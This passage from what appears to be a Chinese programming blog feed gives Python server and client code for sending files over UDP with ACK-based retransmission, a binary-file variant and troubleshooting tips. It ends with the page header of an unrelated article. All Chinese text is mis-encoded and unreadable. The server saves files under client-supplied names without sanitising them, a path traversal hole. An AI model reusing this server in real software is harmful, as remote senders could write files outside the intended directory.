SAVE_DIR = <span class="hljs-string">"received_files"</span>  <span class="hljs-comment"># æ–‡ä»¶ä¿å­˜ç›®å½•</span>

<span class="hljs-comment"># åˆ›å»ºä¿å­˜ç›®å½•</span>
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(SAVE_DIR):
    os.makedirs(SAVE_DIR)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">udp_file_server</span>():
    <span class="hljs-comment"># 1. åˆ›å»ºUDP Socket</span>
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind((UDP_IP, UDP_PORT))
    <span class="hljs-comment"># å…è®¸ç«¯å£å¤ç”¨ï¼Œé¿å…é‡å¯æŠ¥é”™</span>
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"UDPæ–‡ä»¶æœåŠ¡ç«¯å·²å¯åŠ¨ï¼Œç›‘å¬ç«¯å£ <span class="hljs-subst">{UDP_PORT}</span>..."</span>)

    <span class="hljs-comment"># åˆå§‹åŒ–æ¥æ”¶çŠ¶æ€</span>
    file_data = {}  <span class="hljs-comment"># å­˜å‚¨æ¥æ”¶çš„æ•°æ®åŒ… {åºå·: æ•°æ®}</span>
    total_packets = <span class="hljs-number">0</span>  <span class="hljs-comment"># æ€»åŒ…æ•°</span>
    file_name = <span class="hljs-string">""</span>  <span class="hljs-comment"># æ–‡ä»¶å</span>
    client_addr = <span class="hljs-literal">None</span>  <span class="hljs-comment"># å®¢æˆ·ç«¯åœ°å€</span>

    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            <span class="hljs-comment"># 2. æ¥æ”¶æ•°æ®åŒ…ï¼ˆé˜»å¡ï¼‰</span>
            data, client_addr = server_socket.recvfrom(BUFFER_SIZE + <span class="hljs-number">32</span>)  <span class="hljs-comment"># é¢„ç•™æ ‡è¯†ä½ç©ºé—´</span>
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:
                <span class="hljs-keyword">continue</span>

            <span class="hljs-comment"># è§£ææ•°æ®åŒ…æ ‡è¯†ï¼š"æ–‡ä»¶å|æ€»åŒ…æ•°|å½“å‰åºå·|æ•°æ®"</span>
            <span class="hljs-keyword">try</span>:
                <span class="hljs-comment"># åˆ†å‰²æ ‡è¯†å’Œæ•°æ®ï¼ˆç”¨|åˆ†éš”ï¼Œæœ€åä¸€æ®µæ˜¯æ–‡ä»¶æ•°æ®ï¼‰</span>
                parts = data.decode(<span class="hljs-string">'utf-8'</span>, errors=<span class="hljs-string">'ignore'</span>).split(<span class="hljs-string">'|'</span>, <span class="hljs-number">3</span>)
                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) != <span class="hljs-number">4</span>:
                    <span class="hljs-comment"># ä¸æ˜¯æ–‡ä»¶æ•°æ®åŒ…ï¼Œå¯èƒ½æ˜¯ç»“æŸæ ‡è¯†</span>
                    <span class="hljs-keyword">if</span> data.decode(<span class="hljs-string">'utf-8'</span>) == <span class="hljs-string">"TRANSFER_FINISH"</span>:
                        <span class="hljs-built_in">print</span>(<span class="hljs-string">"å®¢æˆ·ç«¯å‘é€ç»“æŸæ ‡è¯†ï¼Œå¼€å§‹é‡ç»„æ–‡ä»¶..."</span>)
                        <span class="hljs-keyword">break</span>
                    <span class="hljs-keyword">continue</span>

                file_name, total_packets_str, packet_num_str, file_chunk = parts
                total_packets = <span class="hljs-built_in">int</span>(total_packets_str)
                packet_num = <span class="hljs-built_in">int</span>(packet_num_str)
            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ•°æ®åŒ…è§£æå¤±è´¥ï¼š<span class="hljs-subst">{e}</span>"</span>)
                <span class="hljs-comment"># è¿”å›é”™è¯¯ACK</span>
                server_socket.sendto(<span class="hljs-string">f"ERR|<span class="hljs-subst">{packet_num}</span>"</span>.encode(<span class="hljs-string">'utf-8'</span>), client_addr)
                <span class="hljs-keyword">continue</span>

            <span class="hljs-comment"># 3. æ ¡éªŒå¹¶ä¿å­˜æ•°æ®åŒ…</span>
            <span class="hljs-keyword">if</span> <span class="hljs-number">1</span> &lt;= packet_num &lt;= total_packets:
                file_data[packet_num] = file_chunk
                <span class="hljs-comment"># è¿”å›æˆåŠŸACK</span>
                server_socket.sendto(<span class="hljs-string">f"ACK|<span class="hljs-subst">{packet_num}</span>"</span>.encode(<span class="hljs-string">'utf-8'</span>), client_addr)
                <span class="hljs-comment"># æ‰“å°è¿›åº¦</span>
                progress = (<span class="hljs-built_in">len</span>(file_data) / total_packets) * <span class="hljs-number">100</span>
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ¥æ”¶è¿›åº¦ï¼š<span class="hljs-subst">{progress:<span class="hljs-number">.1</span>f}</span>% (<span class="hljs-subst">{<span class="hljs-built_in">len</span>(file_data)}</span>/<span class="hljs-subst">{total_packets}</span>)"</span>, end=<span class="hljs-string">'\r'</span>)

        <span class="hljs-comment"># 4. é‡ç»„å¹¶ä¿å­˜æ–‡ä»¶</span>
        <span class="hljs-keyword">if</span> file_data <span class="hljs-keyword">and</span> total_packets &gt; <span class="hljs-number">0</span>:
            <span class="hljs-comment"># æŒ‰åºå·æ’åºæ•°æ®åŒ…</span>
            sorted_chunks = [file_data[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, total_packets + <span class="hljs-number">1</span>) <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> file_data]
            <span class="hljs-comment"># æ‹¼æ¥æ‰€æœ‰æ•°æ®</span>
            file_path = os.path.join(SAVE_DIR, file_name)
            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:
                <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> sorted_chunks:
                    f.write(chunk.encode(<span class="hljs-string">'utf-8'</span>))  <span class="hljs-comment"># è‹¥ä¼ äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œéœ€è°ƒæ•´ç¼–ç é€»è¾‘ï¼ˆè§è¿›é˜¶éƒ¨åˆ†ï¼‰</span>
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\næ–‡ä»¶æ¥æ”¶å®Œæˆï¼ä¿å­˜è·¯å¾„ï¼š<span class="hljs-subst">{file_path}</span>"</span>)
            <span class="hljs-comment"># å‘é€å®Œæˆç¡®è®¤</span>
            server_socket.sendto(<span class="hljs-string">"FILE_SAVED"</span>.encode(<span class="hljs-string">'utf-8'</span>), client_addr)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"\næœªæ¥æ”¶åˆ°å®Œæ•´æ–‡ä»¶æ•°æ®"</span>)

    <span class="hljs-keyword">except</span> KeyboardInterrupt:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\næœåŠ¡ç«¯æ‰‹åŠ¨åœæ­¢"</span>)
    <span class="hljs-keyword">finally</span>:
        server_socket.close()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    udp_file_server()
</code></pre>
<h3 data-id="heading-3">2. å®¢æˆ·ç«¯ä»£ç ï¼ˆå‘é€æ–‡ä»¶ï¼‰</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> time

<span class="hljs-comment"># é…ç½®å‚æ•°</span>
SERVER_IP = <span class="hljs-string">"127.0.0.1"</span>  <span class="hljs-comment"># æœåŠ¡ç«¯IPï¼ˆè¿œç¨‹ä¼ è¾“æ”¹å®é™…IPï¼‰</span>
SERVER_PORT = <span class="hljs-number">9999</span>
BUFFER_SIZE = <span class="hljs-number">1024</span>  <span class="hljs-comment"># æ¯ä¸ªæ•°æ®åŒ…çš„æ–‡ä»¶æ•°æ®å¤§å°</span>
RETRY_TIMES = <span class="hljs-number">3</span>  <span class="hljs-comment"># å•ä¸ªæ•°æ®åŒ…æœ€å¤§é‡ä¼ æ¬¡æ•°</span>
RETRY_INTERVAL = <span class="hljs-number">0.5</span>  <span class="hljs-comment"># é‡ä¼ é—´éš”ï¼ˆç§’ï¼‰</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">udp_file_client</span>(<span class="hljs-params">file_path</span>):
    <span class="hljs-comment"># 1. æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(file_path):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"é”™è¯¯ï¼šæ–‡ä»¶ <span class="hljs-subst">{file_path}</span> ä¸å­˜åœ¨"</span>)
        <span class="hljs-keyword">return</span>

    <span class="hljs-comment"># è·å–æ–‡ä»¶åå’Œæ–‡ä»¶å¤§å°</span>
    file_name = os.path.basename(file_path)
    file_size = os.path.getsize(file_path)
    <span class="hljs-comment"># è®¡ç®—æ€»åŒ…æ•°ï¼ˆå‘ä¸Šå–æ•´ï¼‰</span>
    total_packets = (file_size + BUFFER_SIZE - <span class="hljs-number">1</span>) // BUFFER_SIZE
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å‡†å¤‡å‘é€æ–‡ä»¶ï¼š<span class="hljs-subst">{file_name}</span>ï¼Œå¤§å°ï¼š<span class="hljs-subst">{file_size}</span>å­—èŠ‚ï¼Œæ€»åŒ…æ•°ï¼š<span class="hljs-subst">{total_packets}</span>"</span>)

    <span class="hljs-comment"># 2. åˆ›å»ºUDP Socket</span>
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)
    <span class="hljs-comment"># è®¾ç½®è¶…æ—¶ï¼ˆé¿å…ç­‰å¾…ACKå¡æ­»ï¼‰</span>
    client_socket.settimeout(<span class="hljs-number">2</span>)

    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># 3. è¯»å–æ–‡ä»¶å¹¶åˆ†å—å‘é€</span>
        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">'r'</span>, encoding=<span class="hljs-string">'utf-8'</span>) <span class="hljs-keyword">as</span> f:  <span class="hljs-comment"># äºŒè¿›åˆ¶æ–‡ä»¶ç”¨'rb'ï¼ˆè§è¿›é˜¶éƒ¨åˆ†ï¼‰</span>
            <span class="hljs-keyword">for</span> packet_num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, total_packets + <span class="hljs-number">1</span>):
                <span class="hljs-comment"># è¯»å–å½“å‰å—æ•°æ®</span>
                file_chunk = f.read(BUFFER_SIZE)
                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file_chunk:
                    <span class="hljs-keyword">break</span>

                <span class="hljs-comment"># æ„é€ æ•°æ®åŒ…ï¼š"æ–‡ä»¶å|æ€»åŒ…æ•°|å½“å‰åºå·|æ•°æ®"</span>
                packet_data = <span class="hljs-string">f"<span class="hljs-subst">{file_name}</span>|<span class="hljs-subst">{total_packets}</span>|<span class="hljs-subst">{packet_num}</span>|<span class="hljs-subst">{file_chunk}</span>"</span>.encode(<span class="hljs-string">'utf-8'</span>)
                retry_count = <span class="hljs-number">0</span>
                ack_received = <span class="hljs-literal">False</span>

                <span class="hljs-comment"># 4. å‘é€å¹¶ç­‰å¾…ACKï¼Œå¤±è´¥åˆ™é‡ä¼ </span>
                <span class="hljs-keyword">while</span> retry_count &lt; RETRY_TIMES <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> ack_received:
                    <span class="hljs-keyword">try</span>:
                        <span class="hljs-comment"># å‘é€æ•°æ®åŒ…</span>
                        client_socket.sendto(packet_data, (SERVER_IP, SERVER_PORT))
                        <span class="hljs-comment"># ç­‰å¾…ACK</span>
                        ack_data, _ = client_socket.recvfrom(<span class="hljs-number">128</span>)
                        ack_parts = ack_data.decode(<span class="hljs-string">'utf-8'</span>).split(<span class="hljs-string">'|'</span>)
                        <span class="hljs-keyword">if</span> ack_parts[<span class="hljs-number">0</span>] == <span class="hljs-string">"ACK"</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(ack_parts[<span class="hljs-number">1</span>]) == packet_num:
                            ack_received = <span class="hljs-literal">True</span>
                            <span class="hljs-comment"># æ‰“å°è¿›åº¦</span>
                            progress = (packet_num / total_packets) * <span class="hljs-number">100</span>
                            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å‘é€è¿›åº¦ï¼š<span class="hljs-subst">{progress:<span class="hljs-number">.1</span>f}</span>% (<span class="hljs-subst">{packet_num}</span>/<span class="hljs-subst">{total_packets}</span>)"</span>, end=<span class="hljs-string">'\r'</span>)
                    <span class="hljs-keyword">except</span> socket.timeout:
                        retry_count += <span class="hljs-number">1</span>
                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\næ•°æ®åŒ… <span class="hljs-subst">{packet_num}</span> è¶…æ—¶ï¼Œé‡ä¼  <span class="hljs-subst">{retry_count}</span>/<span class="hljs-subst">{RETRY_TIMES}</span>"</span>)
                        time.sleep(RETRY_INTERVAL)
                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\næ•°æ®åŒ… <span class="hljs-subst">{packet_num}</span> å‘é€å¤±è´¥ï¼š<span class="hljs-subst">{e}</span>"</span>)
                        retry_count += <span class="hljs-number">1</span>
                        time.sleep(RETRY_INTERVAL)

                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ack_received:
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\né”™è¯¯ï¼šæ•°æ®åŒ… <span class="hljs-subst">{packet_num}</span> é‡ä¼ <span class="hljs-subst">{RETRY_TIMES}</span>æ¬¡å¤±è´¥ï¼Œä¼ è¾“ç»ˆæ­¢"</span>)
                    <span class="hljs-keyword">return</span>

        <span class="hljs-comment"># 5. å‘é€ç»“æŸæ ‡è¯†</span>
        client_socket.sendto(<span class="hljs-string">"TRANSFER_FINISH"</span>.encode(<span class="hljs-string">'utf-8'</span>), (SERVER_IP, SERVER_PORT))
        <span class="hljs-comment"># ç­‰å¾…æœåŠ¡ç«¯ä¿å­˜å®Œæˆç¡®è®¤</span>
        <span class="hljs-keyword">try</span>:
            finish_ack, _ = client_socket.recvfrom(<span class="hljs-number">128</span>)
            <span class="hljs-keyword">if</span> finish_ack.decode(<span class="hljs-string">'utf-8'</span>) == <span class="hljs-string">"FILE_SAVED"</span>:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"\næ–‡ä»¶å‘é€å®Œæˆï¼æœåŠ¡ç«¯å·²ä¿å­˜"</span>)
        <span class="hljs-keyword">except</span> socket.timeout:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"\næœªæ”¶åˆ°æœåŠ¡ç«¯å®Œæˆç¡®è®¤ï¼Œä½†æ•°æ®å·²å‘é€å®Œæ¯•"</span>)

    <span class="hljs-keyword">except</span> KeyboardInterrupt:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\nå®¢æˆ·ç«¯æ‰‹åŠ¨åœæ­¢"</span>)
    <span class="hljs-keyword">finally</span>:
        client_socket.close()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-comment"># æ›¿æ¢ä¸ºä½ è¦å‘é€çš„æ–‡ä»¶è·¯å¾„ï¼ˆæœ¬åœ°æµ‹è¯•ç”¨ç»å¯¹/ç›¸å¯¹è·¯å¾„ï¼‰</span>
    target_file = <span class="hljs-string">"test.txt"</span>  <span class="hljs-comment"># ç¤ºä¾‹ï¼šå‘é€å½“å‰ç›®å½•çš„test.txt</span>
    udp_file_client(target_file)
</code></pre>
<h2 data-id="heading-4">ä¸‰ã€åŸºç¡€ç‰ˆä½¿ç”¨æ­¥éª¤</h2>
<ol>
<li><strong>å‡†å¤‡æµ‹è¯•æ–‡ä»¶</strong>ï¼šåœ¨å®¢æˆ·ç«¯ç›®å½•åˆ›å»ºä¸€ä¸ª<code>test.txt</code>æ–‡ä»¶ï¼ˆå†…å®¹ä»»æ„ï¼‰ï¼›</li>
<li><strong>å¯åŠ¨æœåŠ¡ç«¯</strong>ï¼šè¿è¡ŒæœåŠ¡ç«¯ä»£ç ï¼Œæ§åˆ¶å°æ˜¾ç¤ºâ€œUDPæ–‡ä»¶æœåŠ¡ç«¯å·²å¯åŠ¨â€ï¼›</li>
<li><strong>å¯åŠ¨å®¢æˆ·ç«¯</strong>ï¼šä¿®æ”¹å®¢æˆ·ç«¯ä»£ç ä¸­<code>target_file</code>ä¸ºå®é™…æ–‡ä»¶è·¯å¾„ï¼Œè¿è¡Œå®¢æˆ·ç«¯ï¼›</li>
<li><strong>æŸ¥çœ‹ç»“æœ</strong>ï¼šæœåŠ¡ç«¯æ§åˆ¶å°æ˜¾ç¤ºä¼ è¾“è¿›åº¦ï¼Œå®Œæˆåæ–‡ä»¶ä¼šä¿å­˜åˆ°<code>received_files</code>ç›®å½•ã€‚</li>
</ol>
<h2 data-id="heading-5">å››ã€å…³é”®ä¼˜åŒ–ï¼šæ”¯æŒäºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆå›¾ç‰‡/è§†é¢‘/å‹ç¼©åŒ…ï¼‰</h2>
<p>åŸºç¡€ç‰ˆä»…æ”¯æŒæ–‡æœ¬æ–‡ä»¶ï¼Œè¦ä¼ è¾“å›¾ç‰‡ã€è§†é¢‘ç­‰äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œéœ€ä¿®æ”¹<strong>ç¼–ç é€»è¾‘</strong>ï¼ˆæ ¸å¿ƒæ˜¯é¿å…å­—ç¬¦ç¼–ç å¯¼è‡´çš„æ•°æ®æŸåï¼‰ï¼š</p>
<h3 data-id="heading-6">1. å®¢æˆ·ç«¯ä¿®æ”¹ï¼ˆè¯»å–äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ›¿æ¢å®¢æˆ·ç«¯æ–‡ä»¶è¯»å–éƒ¨åˆ†</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:  <span class="hljs-comment"># æ”¹ä¸ºäºŒè¿›åˆ¶è¯»å–</span>
    <span class="hljs-keyword">for</span> packet_num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, total_packets + <span class="hljs-number">1</span>):
        file_chunk = f.read(BUFFER_SIZE)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file_chunk:
            <span class="hljs-keyword">break</span>
    <span class="hljs-comment"># æ„é€ æ•°æ®åŒ…ï¼šç”¨ç‰¹æ®Šåˆ†éš”ç¬¦ï¼ˆå¦‚b'|||'ï¼‰ï¼Œé¿å…äºŒè¿›åˆ¶æ•°æ®å†²çª</span>
    packet_header = <span class="hljs-string">f"<span class="hljs-subst">{file_name}</span>|<span class="hljs-subst">{total_packets}</span>|<span class="hljs-subst">{packet_num}</span>"</span>.encode(<span class="hljs-string">'utf-8'</span>)
    packet_data = packet_header + <span class="hljs-string">b'|||'</span> + file_chunk  <span class="hljs-comment"># äºŒè¿›åˆ¶æ‹¼æ¥</span>
</code></pre>
<h3 data-id="heading-7">2. æœåŠ¡ç«¯ä¿®æ”¹ï¼ˆè§£æäºŒè¿›åˆ¶æ•°æ®ï¼‰</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ›¿æ¢æœåŠ¡ç«¯æ•°æ®åŒ…è§£æéƒ¨åˆ†</span>
<span class="hljs-keyword">try</span>:
    <span class="hljs-comment"># åˆ†å‰²å¤´éƒ¨å’ŒäºŒè¿›åˆ¶æ•°æ®ï¼ˆæŒ‰b'|||'åˆ†å‰²ï¼‰</span>
    header, file_chunk = data.split(<span class="hljs-string">b'|||'</span>, <span class="hljs-number">1</span>)
    <span class="hljs-comment"># è§£æå¤´éƒ¨ï¼ˆè½¬å­—ç¬¦ä¸²ï¼‰</span>
    parts = header.decode(<span class="hljs-string">'utf-8'</span>).split(<span class="hljs-string">'|'</span>, <span class="hljs-number">2</span>)
    file_name, total_packets_str, packet_num_str = parts
    total_packets = <span class="hljs-built_in">int</span>(total_packets_str)
    packet_num = <span class="hljs-built_in">int</span>(packet_num_str)
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"äºŒè¿›åˆ¶æ•°æ®åŒ…è§£æå¤±è´¥ï¼š<span class="hljs-subst">{e}</span>"</span>)
    <span class="hljs-keyword">continue</span>

<span class="hljs-comment"># ä¿å­˜æ—¶ç›´æ¥å†™å…¥äºŒè¿›åˆ¶æ•°æ®</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:
    <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> sorted_chunks:
        f.write(chunk)  <span class="hljs-comment"># æ— éœ€encodeï¼Œç›´æ¥å†™äºŒè¿›åˆ¶</span>
</code></pre>
<h2 data-id="heading-8">äº”ã€é¿å‘æŒ‡å—ï¼šå¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-9">1. æ•°æ®åŒ…ä¸¢åŒ…/é‡ä¼ å¤±è´¥</h3>
<ul>
<li>åŸå› ï¼šUDPæ— å¯é æ€§ä¿è¯ï¼Œç½‘ç»œæ³¢åŠ¨æ˜“ä¸¢åŒ…ï¼›</li>
<li>è§£å†³æ–¹æ¡ˆï¼š
<ul>
<li>å¢å¤§<code>RETRY_TIMES</code>ï¼ˆå¦‚æ”¹ä¸º5ï¼‰ï¼Œå»¶é•¿<code>RETRY_INTERVAL</code>ï¼›</li>
<li>å‡å°<code>BUFFER_SIZE</code>ï¼ˆå¦‚æ”¹ä¸º512ï¼‰ï¼Œé™ä½å•åŒ…ä¼ è¾“å‹åŠ›ï¼›</li>
<li>è¿œç¨‹ä¼ è¾“æ—¶ç¡®ä¿æœåŠ¡ç«¯ç«¯å£å·²å¼€æ”¾é˜²ç«å¢™ã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-10">2. å¤§æ–‡ä»¶ä¼ è¾“å¡é¡¿</h3>
<ul>
<li>åŸå› ï¼šå¾ªç¯å‘é€æœªåšé€Ÿç‡æ§åˆ¶ï¼Œç½‘ç»œæ‹¥å¡ï¼›</li>
<li>è§£å†³æ–¹æ¡ˆï¼šåœ¨å®¢æˆ·ç«¯å‘é€æ¯ä¸ªæ•°æ®åŒ…åæ·»åŠ <code>time.sleep(0.001)</code>ï¼Œæ§åˆ¶å‘é€é€Ÿç‡ã€‚</li>
</ul>
<h3 data-id="heading-11">3. æ•°æ®åŒ…è§£æé”™è¯¯</h3>
<ul>
<li>åŸå› ï¼šåˆ†éš”ç¬¦ï¼ˆ|ï¼‰ä¸æ–‡ä»¶å†…å®¹å†²çªï¼›</li>
<li>è§£å†³æ–¹æ¡ˆï¼šæ”¹ç”¨æ›´å¤æ‚çš„åˆ†éš”ç¬¦ï¼ˆå¦‚<code>|||</code>æˆ–éšæœºå­—ç¬¦ä¸²ï¼‰ï¼Œæˆ–å¯¹å¤´éƒ¨åšBase64ç¼–ç ã€‚</li>
</ul>
<h3 data-id="heading-12">4. ç«¯å£è¢«å ç”¨</h3>
<ul>
<li>è§£å†³æ–¹æ¡ˆï¼šä¿®æ”¹<code>UDP_PORT</code>ï¼ˆå¦‚æ”¹ä¸º10000ï¼‰ï¼Œå¹¶åœ¨æœåŠ¡ç«¯æ·»åŠ <code>SO_REUSEADDR</code>é€‰é¡¹ï¼ˆä»£ç å·²åŒ…å«ï¼‰ã€‚</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ¤– å½“äººå·¥æ™ºèƒ½å¼€å§‹â€œå†™â€å‰ç«¯ï¼šä¸€åœºç¡…åŸºçš„è‰ºæœ¯åˆ›ä½œ]]></title>    <link>https://juejin.cn/post/7581698635866390554</link>    <guid>https://juejin.cn/post/7581698635866390554</guid>    <pubDate>2025-12-10T01:50:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581698635866390554" data-draft-id="7581738974424481811" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ¤– å½“äººå·¥æ™ºèƒ½å¼€å§‹â€œå†™â€å‰ç«¯ï¼šä¸€åœºç¡…åŸºçš„è‰ºæœ¯åˆ›ä½œ"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,HTML,LLM"/> <meta itemprop="datePublished" content="2025-12-10T01:50:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LeonGao"/> <meta itemprop="url" content="https://juejin.cn/user/3976252950591149"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ¤– å½“äººå·¥æ™ºèƒ½å¼€å§‹â€œå†™â€å‰ç«¯ï¼šä¸€åœºç¡…åŸºçš„è‰ºæœ¯åˆ›ä½œ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3976252950591149/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LeonGao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T01:50:45.000Z" title="Wed Dec 10 2025 01:50:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body{overflow:hidden;line-height:1.75;font-size:15px;background-image:linear-gradient(90deg,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0),linear-gradient(1turn,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0);background-size:20px 20px;background-position:50%;padding-top:0!important}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{position:relative;display:flex;border-bottom:5px solid #6d4e00;line-height:35px;letter-spacing:1px;font-size:25px;padding-left:25px;color:#664900;text-shadow:1px 1px 1px #8a6200;padding-bottom:0}.markdown-body h1:before{content:"";display:flex;position:absolute;left:0;top:3px;bottom:0;margin:auto;width:20px;height:20px;background-size:20px 